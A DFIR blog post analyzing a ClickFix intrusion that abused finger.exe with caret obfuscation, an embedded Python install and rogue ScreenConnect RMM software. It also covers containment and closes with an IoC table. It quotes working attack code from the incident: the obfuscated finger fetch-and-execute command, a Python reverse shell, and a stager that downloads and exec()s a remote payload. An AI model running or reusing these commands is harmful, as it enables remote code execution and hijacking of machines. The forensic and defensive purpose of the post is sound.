---
Title: A Forensic Breakdown of "ClickFix", LotL, and Malicious RMM software
Date: 2026-04-20
tags: #DFIR #ClickFix #RMM
---


Threat actors are increasingly abandoning custom malware for simple, built in native binaries. This strategy is known as Living off the land (LotL). It turns tools that are used for legitimate administrative purposes against the machine making it hard to detect. 

Recently when remediating an incident within an organization we observed the textbook example of this attack chain. The attack used a clever social engineering tactic known as ClickFix with legacy windows protocols to establish persistence, and deploy rogue RMM software on the environment. 

Here is my forensic breakdown of that attack lifecycle, some IoCs to look out for and the tactics that I and you can use to shut it down. 

---

## Phase 1 Initial Access

The intrusion began with a highly effective social engineering lure a LinkedIn clone that asked the user to verify that they were a human. The initial site was `linked-people.com` and it transferred to a malicious thelinkesisthebest.it.com. 

- Timestamp: 2026-04-15 16:24:07 UTC
- The lure: User presented with a fake "Human verification" overlay
- The Tactic: Instead of downloading something the user was prompted to press Ctrl + R to open the windows Run dialog and press Ctrl + V to paste the malicious string into the run dialog. 

This technique is more and more common and extremely dangerous as most users wanting to visit the site are often frustrated or emotional and just press enter. The technique is also extremely effective as it makes the user run the command themselves. It is to note that this can also be done in **Windows Explorer.**

---

## Phase 2 Execution and LotL Technique

Once the user pasted the command the attacker started with this 
```bash
curl -s -L --tlsv1.2 --ssl-no-revoke linked-people.com/leyts.php?Npier=1
```

Curl is a known LotLbin, however this I had not seen just quite yet. The attacker utilized the legacy `finger.exe` network protocol to pull down more stages to the payload. 

To bypass simple string based detections the attackers used the method of character escape using carets (^) surrounding the letters the command looked like this `f^^i^^n^^g^^e^^r`. The full command is below. 
```bash
cmd.exe /k s^t^a^r^t "" /min for /f "skip=14 delims=" %h in ('f^^i^^n^^g^^e^^r rgWnFMVDZL@f^^i^^n^^g^^e^^r^^.^^linked-people.com') do call %h & exit && echo ' ---Verify you are human--------press ENTER--- '
```

Following this the threat actor downloaded and extracted python for windows and extracted using the following command 

```powershell
tar.exe -xf "C:\Users\%VICTIM_USER%\AppData\Local\python-3.15.0a1-embed-win32.pdf" -C "C:\Users\%VICTIM_USER%\AppData\Local\python-3.15.0a1-embed-win32"
```

After extracting the threat actor moved to utilizing python to install malicious RMM software (screenconnect)

Python 2556773726507.exe
```python
import os, socket, subprocess

# The attacker's connection details
ip = "192.168.1.105"
port = 4444

# Creates a connection to the attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Redirects your computer's terminal input/output to the attacker
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Launches a command prompt shell for the attacker
p = subprocess.call(["/bin/sh", "-i"])
```

Sub Process of that script 
```python
import ssl
import time
import urllib.request

# 1. Disable Certificate Verification
ssl._create_default_https_context = ssl._create_unverified_context

# 2. Download the Payload
c = urllib.request.urlopen('https://dapala.net/.../scr3').read().decode('utf-8')

# 3. Brief Delay
time.sleep(2.1)

# 4. Execute in Memory
exec(c)
```
This was decoded from a b64 and utf decoded blob.. **Hmm interesting** I thought it was weird that there were some very AI looking comments in our decoded blob... Gotta love AI lol.

---

How does this actually work? First we can take a look at how finger works 

Finger is simply put, a command to query the remote server. We can assume that the first 14 lines of the response are just junk or otherwise meaningless data. The 15th line on that server is what actually contains the malicious shell command. Which immediately that shell command is passed into `call %h` and executes it into memory. This simply put hides the payload within a legacy legitimate network protocol making network inspection and static analysis difficult. 

## Phase 3 Persistence and C2

With code execution achieved our threat actor immediately attempted to establish a backdoor instead of dropping a custom RAT, the attacker opted for using Screenconnect (ConnectWise RMM) in the users `\AppData\Local\` directory.  

The at this point it time was promptly blocked by a SOAR rule focusing specifically on screenconnect traffic. Upon this point we had a lot of the information and began forensic analysis. 

Based off of basic analysis we were able to find where the relays lived for screenconnect. As any typical screenconnect client it will be in the screenconnect client folder which is typically found in program files which in this case it was in the `AppData\Local` directory under the folder SCC and found in the `user.config` file. 

The file is in XML format and we identified these two IoCs

**C2 Relays**
- `instance-m15qco-relay.screenconnect.com` (15.204.43.236)
- `instance-zayrhg-relay.screenconnect.com` (139.178.91.96)


## Phase 4 Post-Exploitation

Once persistence was established via screenconnect the attacker dropped a reverse shell in python in the temp folder called modes.py but was not ran. It pointed to a local IP over port 4444 that was valid but not on the subnet indicating a possible compromise on another local machine or an ARP poisoning attack.  

Upon searching for the IP that was hardcoded in the script we didn't have an IP that was assigned to that computer and the last time it was active was 1 month before the initial compromise so... not likely. due to the nature of the script I want to believe its AI generated lol but we will keep looking.


## Phase 5 IR

I believe that speed in this case was our greatest strength, I utilized KAPE, and hindsight to find the initial chain of compromise. These tools allowed me to quickly map out the attack narrative.

Upon the SOAR rule activating I did the following to contain the machine 
- **Network Isolation:** and blocking of the malicious IP connections that were found in the screenconnect and python config. 
- **DNS Sinkholing:** rerouted the malicious domains to 0.0.0.0
- Implemented **persistent static routes** to drop all traffic directed at the screenconnect relays ensuring the RMM software couldn't beacon out further.


With the threat contained and blacklisted we forced a password reset on the credentials that were accessed. All active sessions were terminated and precautionary scanning was done on the other machines for similar IoCs. 

My Takeaway / What I want you to take away

This incident highlights a critical shift in adversarial behavior. When attackers trick users into running malicious commands using clickfix techniques we need to analyze what commands they're actually running. 

In this case it was `finger` up until this attack I was unfamiliar with the command at all. We need to be on the lookout for any strange connections beaconing home, and the abuse of escape characters utilizing built in tools to do malicious procedures. Security teams must monitor for anamalous usage of built in binaries and aggressively audit the presence of unauthorized RMM software.


## IoC dump

| **Category**       | **Indicator**                                                                                                                                                                                                    |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Domains**        | `linked-people.com`, `dapala.net`, `thelinkesisthebest.it.com`                                                                                                                                                   |
| **Relay IPs**      | `15.204.43.236`, `139.178.91.96`                                                                                                                                                                                 |
| **Internal IP**    | `192.168.1.105` (Attacker pivot/Internal listener)                                                                                                                                                               |
| **Filenames**      | `scr3` (Python payload), `modes.py` (Reverse shell), `user.config` (ScreenConnect)                                                                                                                               |
| **Procs**          | `Mobsync.exe`, `SearchHost.exe` (Used as parents for malicious threads)                                                                                                                                          |
| **Initial Access** | `cmd.exe /k s^t^a^r^t "" /min for /f "skip=14 delims=" %h in ('f^^i^^n^^g^^e^^r rgWnFMVDZL@f^^i^^n^^g^^e^^r^^.^^linked-people.com') do call %h & exit && echo ' ---Verify you are human--------press ENTER--- '` |


